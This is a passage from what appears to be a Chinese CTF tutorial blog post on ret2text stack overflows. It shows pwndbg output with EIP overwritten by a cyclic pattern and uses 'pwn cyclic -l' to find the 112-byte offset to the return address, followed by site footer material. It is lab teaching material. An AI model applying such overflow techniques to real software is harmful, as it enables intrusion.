+</span></span><span class=line><span class=cl>07:001c│     0xffffcc9c ◂— 0x6261616c <span class=o>(</span><span class=s1>&#39;laab&#39;</span><span class=o>)</span>
+</span></span><span class=line><span class=cl>─────────────────────────────────────<span class=o>[</span> BACKTRACE <span class=o>]</span>─────────────────────────────────────
+</span></span><span class=line><span class=cl> ► <span class=m>0</span> 0x62616164 None
+</span></span><span class=line><span class=cl>   <span class=m>1</span> 0x62616165 None
+</span></span><span class=line><span class=cl>   <span class=m>2</span> 0x62616166 None
+</span></span><span class=line><span class=cl>   <span class=m>3</span> 0x62616167 None
+</span></span><span class=line><span class=cl>   <span class=m>4</span> 0x62616168 None
+</span></span><span class=line><span class=cl>   <span class=m>5</span> 0x62616169 None
+</span></span><span class=line><span class=cl>   <span class=m>6</span> 0x6261616a None
+</span></span><span class=line><span class=cl>   <span class=m>7</span> 0x6261616b None
+</span></span><span class=line><span class=cl>───────────────────────────────────────────────────────────────────────────────────────
+</span></span><span class=line><span class=cl>pwndbg&gt;</span></span></code></pre></td></tr></table></div></div><p>可以看到 <code>EIP 0x62616164 ('daab')</code> 指向了我们输入的字符串, EIP 正常情况下应该指向下一条将要被执行的地址</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-12-1><a class=lnlinks href=#hl-12-1>1</a>
+</span><span class=lnt id=hl-12-2><a class=lnlinks href=#hl-12-2>2</a>
+</span><span class=lnt id=hl-12-3><a class=lnlinks href=#hl-12-3>3</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>pwndbg&gt; pwn cyclic -l <span class=s2>&#34;daab&#34;</span>
+</span></span><span class=line><span class=cl><span class=m>112</span>
+</span></span><span class=line><span class=cl>This <span class=nb>command</span> is deprecated in Pwndbg. Please use the GDB<span class=err>&#39;</span>s built-in syntax <span class=k>for</span> running shell commands instead: !pwn &lt;args&gt;</span></span></code></pre></td></tr></table></div></div><p>112 转化为十六进制是 0x70, 距离返回地址是 0x70 个字节，符合我们之前计算的偏移量 (0x6c + 0x8 = 0x70)</p></div><footer class=post-footer><div class=post-tags><a href=/tags/ctf/>Ctf
+</a><a href=/tags/pwn/>Pwn</a></div><div class=post-share-tools><div class=post-share-loading><i class="fa-solid fa-ellipsis fa-spin"></i></div><div class="a2a_kit a2a_kit_size_32 a2a_default_style"><a class=a2a_dd href=https://www.addtoany.com/share></a><a class=a2a_button_wechat></a><a class=a2a_button_qzone></a><a class=a2a_button_sina_weibo></a><a class=a2a_button_douban></a><a class=a2a_button_facebook></a><a class=a2a_button_x></a><a class=a2a_button_email></a><a class=a2a_button_printfriendly></a></div></div><hr><div class=reward-container><div><i class="fa-solid fa-mug-hot"></i>请我喝杯咖啡吧 ヾ(^▽^*)))</div><button>
+赞赏</button><div class=post-reward><div class=post-reward-item><img src=/imgs/img-lazy-loading.gif data-src=/imgs/ali-pay.jpg alt="lhon901 - 支付宝">
+<span>支付宝</span></div><div class=post-reward-item><img src=/imgs/img-lazy-loading.gif data-src=/imgs/wechat-pay.jpg alt="lhon901 - 微信">
+<span>微信</span></div></div></div><div class=post-copyright><img src=/imgs/cc/cc.svg class=cc-icon width=75 height=75 align=right alt=共享知识 title=共享知识><ul><li class=post-copyright-title><strong>文章标题：</strong>
+从零开始的 Pwn 之旅 - Ret2text</li><li class=post-copyright-author><strong>本文作者： </strong>lhon901</li><li class=post-copyright-link><strong>本文链接：</strong>
+<a id=post-cr-link href=/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2text/ title="从零开始的 Pwn 之旅 - Ret2text">/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2text/</a></li><li class=post-copyright-license><strong>版权声明： </strong>本作品采用 <i class="fab fa-fw fa-creative-commons"></i><a target=_blank href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans>BY-NC-SA</a> 许可协议。转载请注明出处！</li><li><div class=license-icons><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans target=_blank><img src=/imgs/cc/big/by_nc_sa.svg alt=BY-NC-SA title=BY-NC-SA>
+</a><a href=https://notbyai.fyi target=_blank><img src=/imgs/notbyai/zh-hans/.svg title="Not By AI"></a></div></li></ul></div><div class=followme><span>欢迎关注我的其它发布渠道</span><div class=social-list><div class=social-item><a target=_blank class=social-link href=/images/wechat_channel.jpg><span class=icon><i class="fab fa-weixin"></i>
+</span><span class=label>WeChat</span></a></div><div class=social-item><a target=_blank class=social-link href=/atom.xml><span class=icon><i class="fa fa-rss"></i>
+</span><span class=label>RSS</span></a></div></div></div><div class=post-nav><div class="post-nav-next post-nav-item"></div><div class="post-nav-prev post-nav-item"><a href=/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E6%A0%88%E5%AF%B9%E9%BD%90/ rel=prev title="从零开始的 Pwn 之旅 - 栈对齐">从零开始的 Pwn 之旅 - 栈对齐
+<i class="fa fa-chevron-right"></i></a></div></div></footer></article></div></div></main><footer class=footer><div class=footer-inner><div id=i18n-translate class=i18n-translate><i class="fa fa-language"></i><div id=lang-select class=lang-select><div id=lang-selected class=selected-option><span class="flag-icon flag-icon-zh-cn"></span>
+<span class=selected-language>简体中文</span>
+<i class="fa fa-chevron-down"></i></div><div id=lang-options class=lang-options><div class=lang-option lang-code=zh-cn lang-name=简体中文 lang-url=/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2text/><span class="flag-icon flag-icon-zh-cn"></span>
+<span class=lang-name>简体中文</span></div></div></div></div><div class=copyright>&copy;
+<span itemprop=copyrightYear>2025
+</span><span class=with-love><i class="fa fa-heart"></i>
+</span><span class=author itemprop=copyrightHolder>© 2024 lhon901. All rights reserved.</span></div><div class=powered-by>由 <a href=https://gohugo.io title=0.146.0 target=_blank>Hugo</a> & <a href=https://github.com/hugo-next/hugo-theme-next title=4.8.3 target=_blank>Hugo NexT.Gemini</a> 强力驱动</div></div></footer><script class=next-config data-name=page type=application/json>{"clipboard":{"js":{"alias":"clipboard","file":"dist/clipboard.min.js","name":"clipboard.js","version":"2.0.11"}},"comments":false,"expired":false,"isHome":false,"isPage":true,"path":"%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2text","permalink":"/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2text/","title":"从零开始的 Pwn 之旅 - Ret2text","toc":true,"waline":{"commentcnt":{"alias":"@waline/client","alias_name":"waline","file":"dist/comment.js","name":"comment","version":"2.15.8"}}}</script><script type=text/javascript src=/js/3rd/animejs/3.2.2/anime.min.js crossorigin=anonymous defer></script><script type=text/javascript src=/js/3rd/viewerjs/1.11.6/viewer.min.js crossorigin=anonymous defer></script><script class=next-config data-name=main type=application/json>{"bookmark":{"color":"#222","enable":true,"save":"manual"},"copybtn":true,"darkmode":false,"giscus":{"cfg":{"category":"Comments","categoryid":null,"emit":false,"inputposition":"top","mapping":"title","reactions":false,"repo":"username/repo-name","repoid":null,"theme":"preferred_color_scheme"},"js":"https://giscus.app/client.js"},"hostname":"/","i18n":{"ds_day":" 天前","ds_days":" 天 ","ds_hour":" 小时前","ds_hours":" 小时 ","ds_just":"刚刚","ds_min":" 分钟前","ds_mins":" 分钟","ds_month":" 个月前","ds_years":" 年 ","empty":"没有找到任何搜索结果：${query}","hits":"找到 ${hits} 个搜索结果","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","placeholder":"搜索..."},"isMultiLang":true,"lang":"zh-CN","lazyload":false,"localSearch":{"enable":true,"limit":1e3,"path":"/searchindexes.xml","preload":false,"topnperarticle":-1,"trigger":"auto","unescape":false},"motion":{"async":true,"enable":true,"transition":{"collheader":"slideInRight","postblock":"fadeIn","postbody":"fadeInDown","postheader":"fadeInDown","sidebar":"fadeInUp"}},"postmeta":{"comments":{"enable":true,"plugin":"waline"},"views":{"enable":true,"plugin":"busuanzi"}},"root":"/","scheme":"Gemini","share":{"addtoany":{"js":"https://static.addtoany.com/menu/page.js","locale":"zh-CN","num":8},"enable":true},"sidebar":{"display":"post","offset":12,"padding":18,"position":"left","width":256},"vendor":{"plugins":"local","router":{"name":"local","type":"modern","url":"/js/3rd"}},"version":"4.8.3","waline":{"cfg":{"emoji":false,"imguploader":false,"placeholder":"请文明发言哟 ヾ(≧▽≦*)o","reaction":true,"reactiontext":["点赞","踩一下","得意","不屑","尴尬","睡觉"],"reactiontitle":"你认为这篇文章怎么样？","requiredmeta":["nick","mail"],"serverurl":null,"sofa":"快来发表你的意见吧 (≧∀≦)ゞ","wordlimit":200},"css":{"alias":"@waline/client","file":"dist/waline.css","name":"waline","version":"2.15.8"},"js":{"alias":"@waline/client","file":"dist/waline.js","name":"waline","version":"2.15.8"}}}</script><script type=text/javascript src="/js/main.min.js?=1750860884" defer></script><script type=text/javascript src="/js/clipboard.min.js?=1750860884" defer></script></body></html>
